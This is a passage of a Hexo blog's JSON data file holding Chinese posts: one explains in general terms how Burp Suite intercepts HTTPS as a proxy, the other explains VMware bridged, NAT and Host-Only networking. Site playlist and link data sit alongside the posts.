hello，与真正的服务器建立另一个连接（暂称其为C2）。</p>\n<p>所以真正的请求是浏览器通过C1向burpsuite提交数据，burpsuite又从C1中把http数据拿出来通过C2提交到真正的服务器，响应过程则反过来，将服务器通过C2传输的http数据拿出来，用自己的私钥加密，再传给浏览器。</p>\n<p>burpsuite不能直接把服务器的证书和数据包一起转给浏览器，只能用CA的公钥解包后提取数据，引入自己的证书再加密发给浏览器；否则，直接将服务器证书交给浏览器，burpsuite就拿不到里面的服务器公钥了，之后就算抓到数据包，没有服务器私钥也解不出http的内容。</p>\n<p>burpsuite本质上即是一个中间人，或者说中间人攻击说的就是burpsuite这种形式。</p>\n<p>而如果浏览器发现收到的证书的签发机构不在自己的信任列表中则会报错或警告。</p>\n<p>具体到burpsuite，返回给浏览器的证书是burpsuite自己签名的证书（burpsuite代理时返回给浏览器的证书是burpsuite针对该网站临时签名的证书，）而burpsuite自己的证书不在浏览器默认的信任CA列表中，所以会导致警报或报错。</p>\n<p>所以为什么在使用burpsuite拦截https前，要导入burp suite的证书，就是要把burpsuite的CA证书导入到浏览器的信任证书机构列表中的，使浏览器以后再接收到burpsuite签发的证书时不再报错。</p>\n<p>导入的证书信息如下：</p>\n<p><img src=\"https://img2018.cnblogs.com/blog/1116722/201907/1116722-20190717104300636-2032046177.png\" alt=\"img\"></p>\n<p>burpsuite代理该问网站时，网站证书如下：</p>\n<p><img src=\"https://img2018.cnblogs.com/blog/1116722/201907/1116722-20190717104415239-1588036366.png\" alt=\"img\"></p>\n<p>直接访问网站时，网站证书如下：</p>\n<p><img src=\"https://img2018.cnblogs.com/blog/1116722/201907/1116722-20190717104607056-1486305447.png\" alt=\"img\"></p>\n<script>\n        document.querySelectorAll('.github-emoji')\n          .forEach(el => {\n            if (!el.dataset.src) { return; }\n            const img = document.createElement('img');\n            img.style = 'display:none !important;';\n            img.src = el.dataset.src;\n            img.addEventListener('error', () => {\n              img.remove();\n              el.style.color = 'inherit';\n              el.style.backgroundImage = 'none';\n              el.style.background = 'none';\n            });\n            img.addEventListener('load', () => {\n              img.remove();\n            });\n            document.body.appendChild(img);\n          });\n      </script>","site":{"data":{"musics":[{"name":"故梦","artist":"双笙","url":"http://music.163.com/song/media/outer/url?id=409654891.mp3","cover":"http://p2.music.126.net/GZJY3Iz7TacxI3pr4jvQYQ==/18007801439911769.jpg?param=130y130"},{"name":"这个世界不会好","artist":"子默","url":"http://music.163.com/song/media/outer/url?id=571464961.mp3","cover":"http://p1.music.126.net/nzsUiw0881szTUdrgi5G1g==/109951165044907847.jpg?param=130y130"},{"name":"Beautiful World","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=20707408.mp3","cover":"https://p2.music.126.net/MEWr-THANcYy-1jvx334_Q==/109951163167214019.jpg?param=130y130"},{"name":"River Flows in You","artist":"Yiruma","url":"http://music.163.com/song/media/outer/url?id=26237342.mp3","cover":"https://p2.music.126.net/8ZRSyI0ZN_4ah8uzsNd1mA==/2324367581169008.jpg?param=130y130"},{"name":"Hello My Love","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=1338728670.mp3","cover":"https://p2.music.126.net/P2_COhPmlhsOpoj31DDLeA==/109951163785867445.jpg?param=130y130"},{"name":"If I Let You Go","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=27220254.mp3","cover":"https://p2.music.126.net/TcOOoZSbISGT9AkhUtwOsg==/5644892697128237.jpg?param=130y130"},{"name":"Señorita","artist":"Shawn Mendes/Camila Cabello","url":"http://music.163.com/song/media/outer/url?id=1373168742.mp3","cover":"https://p2.music.126.net/eSrLKe5g3U8jX-lb629q6A==/109951164162885535.jpg?param=130y130"}],"galleries":[{"name":"背景图片3","cover":"背景图片/bg_pic_107.jpg","description":"背景图片","photos":["背景图片/bg_pic_101.jpg","背景图片/bg_pic_102.jpg","背景图片/bg_pic_103.jpg","背景图片/bg_pic_104.jpg","背景图片/bg_pic_105.jpg","背景图片/bg_pic_106.jpg","背景图片/bg_pic_107.jpg","背景图片/bg_pic_108.jpg","背景图片/bg_pic_109.jpg","背景图片/bg_pic_110.jpg","背景图片/bg_pic_111.jpg","背景图片/bg_pic_112.jpg","背景图片/bg_pic_113.jpg"]},{"name":"背景图片4","cover":"背景图片/bg_pic_130.jpg","description":"背景图片","photos":["背景图片/bg_pic_151.jpg","背景图片/bg_pic_152.jpg","背景图片/bg_pic_153.jpg","背景图片/bg_pic_154.jpg","背景图片/bg_pic_155.jpg","背景图片/bg_pic_156.jpg","背景图片/bg_pic_157.jpg","背景图片/bg_pic_158.jpg","背景图片/bg_pic_159.jpg","背景图片/bg_pic_160.jpg","背景图片/bg_pic_161.jpg","背景图片/bg_pic_162.jpg","背景图片/bg_pic_163.jpg","背景图片/bg_pic_164.jpg","背景图片/bg_pic_165.jpg"]}],"friends":[{"name":"Liloong3tの博客","introduction":"CTFer","url":"http://liloong3t.com","title":"去看看","avatar":"/favicon.png"},{"name":"wust-ais","url":"https://wust-ais.github.io/","title":"访问主页","introduction":"武汉科技大学信安协会欢迎您的加入！","avatar":"/medias/avatars/wust-ais.png"},{"name":"Blinkfox","url":"https://blinkfox.github.io","title":"前去学习","introduction":"闪烁之狐大佬做的hexo主题很棒，人也很好！","avatar":"https://blinkfox.github.io/medias/avatar.jpg"}]}},"excerpt":"","more":"<h1 id=\"Burpsuite拦截HTTPS过程与原理\"><a href=\"#Burpsuite拦截HTTPS过程与原理\" class=\"headerlink\" title=\"Burpsuite拦截HTTPS过程与原理\"></a>Burpsuite拦截HTTPS过程与原理</h1><h2 id=\"SSL握手过程\"><a href=\"#SSL握手过程\" class=\"headerlink\" title=\"SSL握手过程\"></a>SSL握手过程</h2><p>访问https网站，浏览器向服务器发送ssl client  hello请求，服务器进行响应发回自己的证书（是的每一次建立ssl连接服务器都会向客户端发送证书不要怀疑），浏览器收到服务器的证书后检测证书的签发机构（即CA）是否在自己信任的机构列表中，如果不在则浏览器报错并终止ssl握手过程如果在则继续进行后续握手步骤。</p>\n<h2 id=\"https代理原理\"><a href=\"#https代理原理\" class=\"headerlink\" title=\"https代理原理\"></a>https代理原理</h2><p>首先，浏览器向服务器发起ssl client  hello请求</p>\n<p>burpsuite作为代理，可以理解为它“伪造“成服务器，向浏览器发回使用burpsuite自己证书作为为当前目标网站的证书与浏览器建立一个连接（暂称其为C1）；</p>\n<p>同时burpsuite向真正的服务器发送一个ssl client  hello，与真正的服务器建立另一个连接（暂称其为C2）。</p>\n<p>所以真正的请求是浏览器通过C1向burpsuite提交数据，burpsuite又从C1中把http数据拿出来通过C2提交到真正的服务器，响应过程则反过来，将服务器通过C2传输的http数据拿出来，用自己的私钥加密，再传给浏览器。</p>\n<p>burpsuite不能直接把服务器的证书和数据包一起转给浏览器，只能用CA的公钥解包后提取数据，引入自己的证书再加密发给浏览器；否则，直接将服务器证书交给浏览器，burpsuite就拿不到里面的服务器公钥了，之后就算抓到数据包，没有服务器私钥也解不出http的内容。</p>\n<p>burpsuite本质上即是一个中间人，或者说中间人攻击说的就是burpsuite这种形式。</p>\n<p>而如果浏览器发现收到的证书的签发机构不在自己的信任列表中则会报错或警告。</p>\n<p>具体到burpsuite，返回给浏览器的证书是burpsuite自己签名的证书（burpsuite代理时返回给浏览器的证书是burpsuite针对该网站临时签名的证书，）而burpsuite自己的证书不在浏览器默认的信任CA列表中，所以会导致警报或报错。</p>\n<p>所以为什么在使用burpsuite拦截https前，要导入burp suite的证书，就是要把burpsuite的CA证书导入到浏览器的信任证书机构列表中的，使浏览器以后再接收到burpsuite签发的证书时不再报错。</p>\n<p>导入的证书信息如下：</p>\n<p><img src=\"https://img2018.cnblogs.com/blog/1116722/201907/1116722-20190717104300636-2032046177.png\" alt=\"img\"></p>\n<p>burpsuite代理该问网站时，网站证书如下：</p>\n<p><img src=\"https://img2018.cnblogs.com/blog/1116722/201907/1116722-20190717104415239-1588036366.png\" alt=\"img\"></p>\n<p>直接访问网站时，网站证书如下：</p>\n<p><img src=\"https://img2018.cnblogs.com/blog/1116722/201907/1116722-20190717104607056-1486305447.png\" alt=\"img\"></p>\n"},{"layout":"post","title":"虚拟机网络：桥接、NAT和Host-Only模式","date":"2020-11-19T16:00:00.000Z","description":"虚拟机网络知识","typora-copy-images-to":"..\\img","typora-root-url":"..","_content":"\n# 虚拟机网络：桥接、NAT和Host-Only模式\n\n![image-20201120131717280](E:\\文档\\Github仓库\\LiGuHeiYi\\LiGuHeiYi.github.io\\img\\image-20201120131717280.png)\n\n上面这张图就是vmware虚拟网络编辑器上可以选择的三种虚拟机的网络模式：桥接，NAT和仅主机（Host-Only）\n\n## 桥接\n\n桥接模式就是VMware通过VMnet0虚拟交换机将物理网卡和虚拟网卡进行桥接，“桥接”就是在数据链路层上将两个网络拼接起来的技术（桥接器，交换机）。这样物理网卡和虚拟网卡在网络拓扑上地位相等，也就是相当于在一个网段，物理网卡和虚拟网卡的ip地址在一个局域网里。这里可以让VMware自动设置，也可以手动设置虚拟网卡的ip地址，让它不会和局域网内的其它联网设备ip冲突。\n\n这是物理机通过局域网ip访问本地网站（phpstudy默认主页），局域网ip为：192.168.0.106\n\n![](/img/image-20201121121534108.png)\n\n这是ubuntu虚拟机通过局域网ip访问虚拟机本地网站（apache2默认主页），局域网ip为：192.168.0.107（这个ip紧跟物理机ip，它们在一个网段）\n\n![image-20201121123258281](/img/image-20201121123258281.png)\n\n接下来放两张它们互相访问的图\n\n![image-20201121123534968](/img/image-20201121123534968.png)\n\n![image-20201121123559732](/img/image-20201121123559732.png)\n\n这就很直观了\n\n\n\n## NAT\n\nNAT英文全称是“Network Address Translation”，中文意思是“网络地址转换”，它是一个IETF(Internet Engineering Task  Force, Internet工程任务组)标准，允许一个整体机构以一个公用IP（Internet  Protocol）地址出现在Internet上。顾名思义，它是一种把内部私有网络地址（IP地址）翻译成合法网络IP地址的技术。\n\n通俗的讲，NAT可以使一个局域网中所有主机对外使用一个公网ip，对内使用不同私有ip。其实就是我们现在使用的绝大部分无线路由器默认开启的功能，这就是为什么我们能使用多台设备连接到一个WiFi上，并使用一个“宽带”原因。\n\n虚拟机的NAT模式下，我们的物理机就相当于这样以一个路由器，在虚拟机之间组成了一个“虚拟局域网”，所有NAT模式下的虚拟机拥有一个它们自己独有的，比物理机的私有ip更次一级的私有ip。\n\n它们之间可以通过这个“更次一级的私有ip”互相访问，\n\nkali虚拟机的ip为 192.168.197.129\n\n![kali虚拟机ip](/img/image-20201121125655138.png)\n\nubuntu虚拟机的ip为192.168.197.128，并访问kali的本地网站成功\n\n![ubuntu访问kali主页](/img/image-20201121125922772.png)\n\n**但如果想要使物理机或局域网甚至外网访问虚拟机，必须在虚拟网络编辑器中设置静态端口映射**，这在上一篇博客中已经写过了\n\n### NAT技术类型\n\n \n\n　　NAT有三种类型：静态NAT(Static NAT)、动态地址NAT(Pooled NAT)、网络地址端口转换NAPT（Port－Level NAT）。\n\n \t\t根据不同的需要，三种NAT方案各有利弊。\n\n\n\n　　**静态NAT**设置起来是最为简单和最容易实现的一种，内部网络中的每个主机都被永久映射成外部网络中的某个合法的地址。而动态地址NAT则是在外部网络中定义了一系列的合法地址，采用动态分配的方法映射到内部网络。NAPT则是把内部地址映射到外部网络的一个IP地址的不同端口上。根据不同的需要，三种NAT方案各有利弊。\n\n \n\n　　**动态地址NAT**只是转换IP地址，它为每一个内部的IP地址分配一个**临时的外部IP地址**，主要应用于拨号，对于频繁的远程联接也可以采用动态NAT。当远程用户联接上之后，动态地址NAT就会分配给他一个IP地址，用户断开时，这个IP地址就会被释放而留待以后使用。\n\n \n\n　　**网络地址端口转换NAPT**（Network Address Port  Translation）是人们比较熟悉的一种转换方式（也就是上一篇文章写的设置静态端口映射的方式）。NAPT普遍应用于接入设备中，它可以将中小型的网络隐藏在一个合法的IP地址（私有或公有都行）后面。NAPT与动态地址NAT不同，它将内部连接映射到外部网络中的一个**单独的IP地址**上，同时在该地址上加上一个由NAT设备选定的TCP端口号。\n\n## **Host-Only**\n\n 在Host-Only模式下，虚拟网络是一个全封闭的网络，它唯一能够访问的就是主机。其实Host-Only网络和NAT网络很相似，不同的地方就是Host-Only网络没有NAT服务，所以虚拟网络不能连接到Internet。主机和虚拟机之间的通信是通过VMware Network Adepter VMnet1虚拟网卡来实现的。\n\n　　Host-Only的宗旨就是建立一个与外界隔绝的内部网络，来提高内网的安全性。这个功能或许对普通用户来说没有多大意义，但大型服务商会常常利用这个功能。如果你想为VMnet1网段提供路由功能，那就需要使用RRAS，而不能使用XP或2000的ICS，因为ICS会把内网的IP地址改为192.168.0.1，但虚拟机是不会给VMnet1虚拟网卡分配这个地址的，那么主机和虚拟机之间就不能通信了。","source":"_posts/2020-11-20-虚拟机网络：桥接、NAT和Host-Only模式.md","raw":"---\nlayout: post\ntitle: 虚拟机网络：桥接、NAT和Host-Only模式\ndate: 2020-11-20\ncategories: blog\ntags: [web,虚拟机]\ndescription: 虚拟机网络知识\ntypora-copy-images-to: ..\\img\ntypora-root-url: ..\n---\n\n# 虚拟机网络：桥接、NAT和Host-Only模式\n\n![image-20201120131717280](E:\\文档\\Github仓库\\LiGuHeiYi\\LiGuHeiYi.github.io\\img\\image-20201120131717280.png)\n\n上面这张图就是vmware虚拟网络编辑器上可以选择的三种虚拟机的网络模式：桥接，NAT和仅主机（Host-Only）\n\n## 桥接\n\n桥接模式就是VMware通过VMnet0虚拟交换机将物理网卡和虚拟网卡进行桥接，“桥接”就是在数据链路层上将两个网络拼接起来的技术（桥接器，交换机）。这样物理网卡和虚拟网卡在网络拓扑上地位相等，也就是相当于在一个网段，物理网卡和虚拟网卡的ip地址在一个局域网里。这里可以让VMware自动设置，也可以手动设置虚拟网卡的ip地址，让它不会和局域网内的其它联网设备ip冲突。\n\n这是物理机通过局域网ip访问本地网站（phpstudy默认主页），局域网ip为：192.168.0.106\n\n![](/img/image-20201121121534108.png)\n\n这是ubuntu虚拟机通过局域网ip访问虚拟机本地网站（apache2默认主页），局域网ip为：192.168.0.107（这个ip紧跟物理机ip，它们在一个网段）\n\n![image-20201121123258281](/img/image-20201121123258281.png)\n\n接下来放两张它们互相访问的图\n\n![image-20201121123534968](/img/image-20201121123534968.png)\n\n![image-20201121123559732](/img/image-20201121123559732.png)\n\n这就很直观了\n\n\n\n## NAT\n\nNAT英文全称是“Network Address Translation”，中文意思是“网络地址转换”，它是一个IETF(Internet Engineering Task  Force, Internet工程任务组)标准，允许一个整体机构以一个公用IP（Internet  Protocol）地址出现在Internet上。顾名思义，它是一种把内部私有网络地址（IP地址）翻译成合法网络IP地址的技术。\n\n通俗的讲，NAT可以使一个局域网中所有主机对外使用一个公网ip，对内使用不同私有ip。其实就是我们现在使用的绝大部分无线路由器默认开启的功能，这就是为什么我们能使用多台设备连接到一个WiFi上，并使用一个“宽带”原因。\n\n虚拟机的NAT模式下，我们的物理机就相当于这样以一个路由器，在虚拟机之间组成了一个“虚拟局域网”，所有NAT模式下的虚拟机拥有一个它们自己独有的，比物理机的私有ip更次一级的私有ip。\n\n它们之间可以通过这个“更次一级的私有ip”互相访问，\n\nkali虚拟机的ip为 192.168.197.129\n\n![kali虚拟机ip](/img/image-20201121125655138.png)\n\nubuntu虚拟机的ip为192.168.197.128，并访问kali的本地网站成功\n\n![ubuntu访问kali主页](/img/image-20201121125922772.png)\n\n**但如果想要使物理机或局域网甚至外网访问虚拟机，必须在虚拟网络编辑器中设置静态端口映射**，这在上一篇博客中已经写过了\n\n### NAT技术类型\n\n \n\n　　NAT有三种类型：静态NAT(Static NAT)、动态地址NAT(Pooled NAT)、网络地址端口转换NAPT（Port－Level NAT）。\n\n \t\t根据不同的需要，三种NAT方案各有利弊。\n\n\n\n　　**静态NAT**设置起来是最为简单和最容易实现的一种，内部网络中的每个主机都被永久映射成外部网络中的某个合法的地址。而动态地址NAT则是在外部网络中定义了一系列的合法地址，采用动态分配的方法映射到内部网络。NAPT则是把内部地址映射到外部网络的一个IP地址的不同端口上。根据不同的需要，三种NAT方案各有利弊。\n\n \n\n　　**动态地址NAT**只是转换IP地址，它为每一个内部的IP地址分配一个**临时的外部IP地址**，主要应用于拨号，对于频繁的远程联接也可以采用动态NAT。当远程用户联接上之后，动态地址NAT就会分配给他一个IP地址，用户断开时，这个IP地址就会被释放而留待以后使用。\n\n \n\n　　**网络地址端口转换NAPT**（Network Address Port  Translation）是人们比较熟悉的一种转换方式（也就是上一篇文章写的设置静态端口映射的方式）。NAPT普遍应用于接入设备中，它可以将中小型的网络隐藏在一个合法的IP地址（私有或公有都行）后面。NAPT与动态地址NAT不同，它将内部连接映射到外部网络中的一个**单独的IP地址**上，同时在该地址上加上一个由NAT设备选定的TCP端口号。\n\n## **Host-Only**\n\n 在Host-Only模式下，虚拟网络是一个全封闭的网络，它唯一能够访问的就是主机。其实Host-Only网络和NAT网络很相似，不同的地方就是Host-Only网络没有NAT服务，所以虚拟网络不能连接到Internet。主机和虚拟机之间的通信是通过VMware Network Adepter VMnet1虚拟网卡来实现的。\n\n　　Host-Only的宗旨就是建立一个与外界隔绝的内部网络，来提高内网的安全性。这个功能或许对普通用户来说没有多大意义，但大型服务商会常常利用这个功能。如果你想为VMnet1网段提供路由功能，那就需要使用RRAS，而不能使用XP或2000的ICS，因为ICS会把内网的IP地址改为192.168.0.1，但虚拟机是不会给VMnet1虚拟网卡分配这个地址的，那么主机和虚拟机之间就不能通信了。","slug":"2020-11-20-虚拟机网络：桥接、NAT和Host-Only模式","published":1,"updated":"2020-11-21T05:07:02.246Z","comments":1,"photos":[],"link":"","_id":"ckkntx9jy001bxov70fbyyofv","content":"<h1 id=\"虚拟机网络：桥接、NAT和Host-Only模式\"><a href=\"#虚拟机网络：桥接、NAT和Host-Only模式\" class=\"headerlink\" title=\"虚拟机网络：桥接、NAT和Host-Only模式\"></a>虚拟机网络：桥接、NAT和Host-Only模式</h1><p><img src=\"E:%5C%E6%96%87%E6%A1%A3%5CGithub%E4%BB%93%E5%BA%93%5CLiGuHeiYi%5CLiGuHeiYi.github.io%5Cimg%5Cimage-20201120131717280.png\" alt=\"image-20201120131717280\"></p>\n<p>上面这张图就是vmware虚拟网络编辑器上可以选择的三种虚拟机的网络模式：桥接，NAT和仅主机（Host-Only）</p>\n<h2 id=\"桥接\"><a href=\"#桥接\" class=\"headerlink\" title=\"桥接\"></a>桥接</h2><p>桥接模式就是VMware通过VMnet0虚拟交换机将物理网卡和虚拟网卡进行桥接，“桥接”就是在数据链路层上将两个网络拼接起来的技术（桥接器，交换机）。这样物理网卡和虚拟网卡在网络拓扑上地位相等，也就是相当于在一个网段，物理网卡和虚拟网卡的ip地址在一个局域网里。这里可以让VMware自动设置，也可以手动设置虚拟网卡的ip地址，让它不会和局域网内的其它联网设备ip冲突。</p>\n<p>这是物理机通过局域网ip访问本地网站（phpstudy默认主页），局域网ip为：192.168.0.106</p>\n<p><img src=\"/img/image-20201121121534108.png\" alt=\"\"></p>\n<p>这是ubuntu虚拟机通过局域网ip访问虚拟机本地网站（apache2默认主页），局域网ip为：192.168.0.107（这个ip紧跟物理机ip，它们在一个网段）</p>\n<p><img src=\"/img/image-20201121123258281.png\" alt=\"image-20201121123258281\"></p>\n<p>接下来放两张它们互相访问的图</p>\n<p><img src=\"/img/image-20201121123534968.png\" alt=\"image-20201121123534968\"></p>\n<p><img src=\"/img/image-20201121123559732.png\" alt=\"image-20201121123559732\"></p>\n<p>这就很直观了</p>\n<h2 id=\"NAT\"><a href=\"#NAT\" class=\"headerlink\" title=\"NAT\"></a>NAT</h2><p>NAT英文全称是“Network Address Translation”，中文意思是“网络地址转换”，它是一个IETF(Internet Engineering Task  Force, Internet工程任务组)标准，允许一个整体机构以一个公用IP（Internet  Protocol）地址出现在Internet上。顾名思义，它是一种把内部私有网络地址（IP地址）翻译成合法网络IP地址的技术。</p>\n<p>通俗的讲，NAT可以使一个局域网中所有主机对外使用一个公网ip，对内使用不同私有ip。其实就是我们现在使用的绝大部分无线路由器默认开启的功能，这就是为什么我们能使用多台设备连接到一个WiFi上，并使用一个“宽带”原因。</p>\n<p>虚拟机的NAT模式下，我们的物理机就相当于这样以一个路由器，在虚拟机之间组成了一个“虚拟局域网”，所有NAT模式下的虚拟机拥有一个它们自己独有的，比物理机的私有ip更次一级的私有ip。</p>\n<p>它们之间可以通过这个“更次一级的私有ip”互相访问，</p>\n<p>kali虚拟机的ip为 192.168.197.129</p>\n<p><img src=\"/img/image-20201121125655138.png\" alt=\"kali虚拟机ip\"></p>\n<p>ubuntu虚拟机的ip为192.168.197.128，并访问kali的本地网站成功</p>\n<p><img src=\"/img/image-20201121125922772.png\" alt=\"ubuntu访问kali主页\"></p>\n<p><strong>但如果想要使物理机或局域网甚至外网访问虚拟机，必须在虚拟网络编辑器中设置静态端口映射</strong>，这在上一篇博客中已经写过了</p>\n<h3 id=\"NAT技术类型\"><a href=\"#NAT技术类型\" class=\"headerlink\" title=\"NAT技术类型\"></a>NAT技术类型</h3><p>　　NAT有三种类型：静态NAT(Static NAT)、动态地址NAT(Pooled NAT)、网络地址端口转换NAPT（Port－Level NAT）。</p>\n<pre><code>     根据不同的需要，三种NAT方案各有利弊。</code></pre><p>　　<strong>静态NAT</strong>设置起来是最为简单和最容易实现的一种，内部网络中的每个主机都被永久映射成外部网络中的某个合法的地址。而动态地址NAT则是在外部网络中定义了一系列的合法地址，采用动态分配的方法映射到内部网络。NAPT则是把内部地址映射到外部网络的一个IP地址的不同端口上。根据不同的需要，三种NAT方案各有利弊。</p>\n<p>　　<strong>动态地址NAT</strong>只是转换IP地址，它为每一个内部的IP地址分配一个<strong>临时的外部IP地址</strong>，主要应用于拨号，对于频繁的远程联接也可以采用动态NAT。当远程用户联接上之后，动态地址NAT就会分配给他一个IP地址，用户断开时，这个IP地址就会被释放而留待以后使用。</p>\n<p>　　<strong>网络地址端口转换NAPT</strong>（Network Address Port  Translation）是人们比较熟悉的一种转换方式（也就是上一篇文章写的设置静态端口映射的方式）。NAPT普遍应用于接入设备中，它可以将中小型的网络隐藏在一个合法的IP地址（私有或公有都行）后面。NAPT与动态地址NAT不同，它将内部连接映射到外部网络中的一个<strong>单独的IP地址</strong>上，同时在该地址上加上一个由NAT设备选定的TCP端口号。</p>\n<h2 id=\"Host-Only\"><a href=\"#Host-Only\" class=\"headerlink\" title=\"Host-Only\"></a><strong>Host-Only</strong></h2><p> 在Host-Only模式下，虚拟网络是一个全封闭的网络，它唯一能够访问的就是主机。其实Host-Only网络和NAT网络很相似，不同的地方就是Host-Only网络没有NAT服务，所以虚拟网络不能连接到Internet。主机和虚拟机之间的通信是通过VMware Network Adepter VMnet1虚拟网卡来实现的。</p>\n<p>　　Host-Only的宗旨就是建立一个与外界隔绝的内部网络，来提高内网的安全性。这个功能或许对普通用户来说没有多大意义，但大型服务商会常常利用这个功能。如果你想为VMnet1网段提供路由功能，那就需要使用RRAS，而不能使用XP或2000的ICS，因为ICS会把内网的IP地址改为192.168.0.1，但虚拟机是不会给VMnet1虚拟网卡分配这个地址的，那么主机和虚拟机之间就不能通信了。</p>\n<script>\n        document.querySelectorAll('.github-emoji')\n          .forEach(el => {\n            if (!el.dataset.src) { return; }\n            const img = document.createElement('img');\n            img.style = 'display:none !important;';\n            img.src = el.dataset.src;\n            img.addEventListener('error', () => {\n              img.remove();\n              el.style.color = 'inherit';\n              el.style.backgroundImage = 'none';\n              el.style.background = 'none';\n            });\n            img.addEventListener('load', () => {\n              img.remove();\n            });\n            document.body.appendChild(img);\n          });\n      </script>","site":{"data":{"musics":[{"name":"故梦","artist":"双笙","url":"http://music.163.com/song/media/outer/url?id=409654891.mp3","cover":"http://p2.music.126.net/GZJY3Iz7TacxI3pr4jvQYQ==/18007801439911769.jpg?param=130y130"},{"name":"这个世界不会好","artist":"子默","url":"http://music.163.com/song/media/outer/url?id=571464961.mp3","cover":"http://p1.music.126.net/nzsUiw0881szTUdrgi5G1g==/109951165044907847.jpg?param=130y130"},{"name":"Beautiful World","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=20707408.mp3","cover":"https://p2.music.126.net/MEWr-THANcYy-1jvx334_Q==/109951163167214019.jpg?param=130y130"},{"name":"River Flows in You","artist":"Yiruma","url":"http://music.163.com/song/media/outer/url?id=26237342.mp3","cover":"https://p2.music.126.net/8ZRSyI0ZN_4ah8uzsNd1mA==/2324367581169008.jpg?param=130y130"},{"name":"Hello My Love","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=1338728670.mp3","cover":"https://p2.music.126.net/P2_COhPmlhsOpoj31DDLeA==/109951163785867445.jpg?param=130y130"},{"name":"If I Let You Go","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=27220254.mp3","cover":"https://p2.music.126.net/TcOOoZSbISGT9AkhUtwOsg==/5644892697128237.jpg?param=130y130"},{"name":"Señorita","artist":"Shawn Mendes/Camila Cabello","url":"http://music.163.com/song/media/outer/url?id=1373168742.mp3","cover":"https://p2.music.126.net/eSrLKe5g3U8jX-lb629q6A==/109951164162885535.jpg?param=130y130"}],"galleries":[{"name":"背景图片3","cover":"背景图片/bg_pic_107.jpg","description":"背景图片","photos":["背景图片/bg_pic_101.jpg","背景图片/bg_pic_102.jpg","背景图片/bg_pic_103.jpg","背景图片/bg_pic_104.jpg","背景图片/bg_pic_105.jpg","背景图片/bg_pic_106.jpg","背景图片/bg_pic_107.jpg","背景图片/bg_pic_108.jpg","背景图片/bg_pic_109.jpg","背景图片/bg_pic_110.jpg","背景图片/bg_pic_111.jpg","背景图片/bg_pic_112.jpg","背景图片/bg_pic_113.jpg"]},{"name":"背景图片4","cover":"背景图片/bg_pic_130.jpg","description":"背景图片","photos":["背景图片/bg_pic_151.jpg","背景图片/bg_pic_152.jpg","背景图片/bg_pic_153.jpg","背景图片/bg_pic_154.jpg","背景图片/bg_pic_155.jpg","背景图片/bg_pic_156.jpg","背景图片/bg_pic_157.jpg","背景图片/bg_pic_158.jpg","背景图片/bg_pic_159.jpg","背景图片/bg_pic_160.jpg","背景图片/bg_pic_161.jpg","背景图片/bg_pic_162.jpg","背景图片/bg_pic_163.jpg","背景图片/bg_pic_164.jpg","背景图片/bg_pic_165.jpg"]}],"friends":[{"name":"Liloong3tの博客","introduction":"CTFer","url":"http://liloong3t.com","title":"去看看","avatar":"/favicon.png"},{"name":"wust-ais","url":"https://wust-ais.github.io/","title":"访问主页","introduction":"武汉科技大学信安协会欢迎您的加入！","avatar":"/medias/avatars/wust-ais.png"},{"name":"Blinkfox","url":"https://blinkfox.github.io","title":"前去学习","introduction":"闪烁之狐大佬做的hexo主题很棒，人也很好！","avatar":"https://blinkfox.github.io/medias/avatar.jpg"}]}},"excerpt":"","more":"<h1 id=\"虚拟机网络：桥接、NAT和Host-Only模式\"><a href=\"#虚拟机网络：桥接、NAT和Host-Only模式\" class=\"headerlink\" title=\"虚拟机网络：桥接、NAT和Host-Only模式\"></a>虚拟机网络：桥接、NAT和Host-Only模式</h1><p><img src=\"E:%5C%E6%96%87%E6%A1%A3%5CGithub%E4%BB%93%E5%BA%93%5CLiGuHeiYi%5CLiGuHeiYi.github.io%5Cimg%5Cimage-20201120131717280.png\" alt=\"image-20201120131717280\"></p>\n<p>上面这张图就是vmware虚拟网络编辑器上可以选择的三种虚拟机的网络模式：桥接，NAT和仅主机（Host-Only）</p>\n<h2 id=\"桥接\"><a href=\"#桥接\" class=\"headerlink\" title=\"桥接\"></a>桥接</h2><p>桥接模式就是VMware通过VMnet0虚拟交换机将物理网卡和虚拟网卡进行桥接，“桥接”就是在数据链路层上将两个网络拼接起来的技术（桥接器，交换机）。这样物理网卡和虚拟网卡在网络拓扑上地位相等，也就是相当于在一个网段，物理网卡和虚拟网卡的ip地址在一个局域网里。这里可以让VMware自动设置，也可以手动设置虚拟网卡的ip地址，让它不会和局域网内的其它联网设备ip冲突。</p>\n<p>这是物理机通过局域网ip访问本地网站（phpstudy默认主页），局域网ip为：192.168.0.106</p>\n<p><img src=\"/img/image-20201121121534108.png\" alt></p>\n<p>这是ubuntu虚拟机通过局域网ip访问虚拟机本地网站（apache2默认主页），局域网ip为：192.168.0.107（这个ip紧跟物理机ip，它们在一个网段）</p>\n<p><img src=\"/img/image-20201121123258281.png\" alt=\"image-20201121123258281\"></p>\n<p>接下来放两张它们互相访问的图</p>\n<p><img src=\"/img/image-20201121123534968.png\" alt=\"image-20201121123534968\"></p>\n<p><img src=\"/img/image-20201121123559732.png\" alt=\"image-20201121123559732\"></p>\n<p>这就很直观了</p>\n<h2 id=\"NAT\"><a href=\"#NAT\" class=\"headerlink\" title=\"NAT\"></a>NAT</h2><p>NAT英文全称是“Network Address Translation”，中文意思是“网络地址转换”，它是一个IETF(Internet Engineering Task  Force, Internet工程任务组)标准，允许一个整体机构以一个公用IP（Internet  Protocol）地址出现在Internet上。顾名思义，它是一种把内部私有网络地址（IP地址）翻译成合法网络IP地址的技术。</p>\n<p>通俗的讲，NAT可以使一个局域网中所有主机对外使用一个公网ip，对内使用不同私有ip。其实就是我们现在使用的绝大部分无线路由器默认开启的功能，这就是为什么我们能使用多台设备连接到一个WiFi上，并使用一个“宽带”原因。</p>\n<p>虚拟机的NAT模式下，我们的物理机就相当于这样以一个路由器，在虚拟机之间组成了一个“虚拟局域网”，所有NAT模式下的虚拟机拥有一个它们自己独有的，比物理机的私有ip更次一级的私有ip。</p>\n<p>它们之间可以通过这个“更次一级的私有ip”互相访问，</p>\n<p>kali虚拟机的ip为 192.168.197.129</p>\n<p><img src=\"/img/image-20201121125655138.png\" alt=\"kali虚拟机ip\"></p>\n<p>ubuntu虚拟机的ip为192.168.197.128，并访问kali的本地网站成功</p>\n<p><img src=\"/img/image-20201121125922772.png\" 